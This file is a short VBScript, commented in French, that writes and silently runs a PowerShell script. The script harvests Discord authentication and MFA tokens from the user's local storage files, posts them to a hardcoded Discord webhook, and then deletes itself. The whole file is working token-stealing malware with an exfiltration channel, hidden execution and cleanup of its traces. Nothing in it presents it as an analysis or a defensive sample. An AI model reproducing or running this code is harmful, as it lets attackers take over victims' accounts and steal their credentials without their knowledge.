Dim shell, fso, tempFolder, psScript, webhook
webhook = "https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")

psScript = "$path = $env:APPDATA + '\discord\Local Storage\leveldb\';" & _
           "$webhook = '" & webhook & "';" & _
           "$result = '';" & _
           "Get-ChildItem -Path $path -Filter '*.ldb' | ForEach-Object {" & _
           "  $content = [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($_.FullName));" & _
           "  $pattern = '"""token""":""""([^""""]+)""""';" & _
           "  $match = [regex]::Match($content, $pattern);" & _
           "  if($match.Success) { $result += 'Token: ' + $match.Groups[1].Value + '`n' };" & _
           "  $pattern2 = '(mfa\.[a-zA-Z0-9_-]{80,})';" & _
           "  $match2 = [regex]::Match($content, $pattern2);" & _
           "  if($match2.Success) { $result += 'MFA: ' + $match2.Groups[1].Value + '`n' };" & _
           "};" & _
           "if($result -ne '') {" & _
           "  $body = @{content='**Tokens trouvés :**```' + $result + '```'};" & _
           "  Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'" & _
           "} else {" & _
           "  $body = @{content='**Aucun token trouvé**'};" & _
           "  Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'" & _
           "}"

' Ecrire le script PowerShell dans un fichier temporaire
Dim psFile
psFile = tempFolder & "\discord_extract.ps1"
fso.CreateTextFile(psFile).Write psScript

' Executer le script PowerShell
shell.Run "powershell -ExecutionPolicy Bypass -File """ & psFile & """", 0, True

' Nettoyer
fso.DeleteFile psFile, True
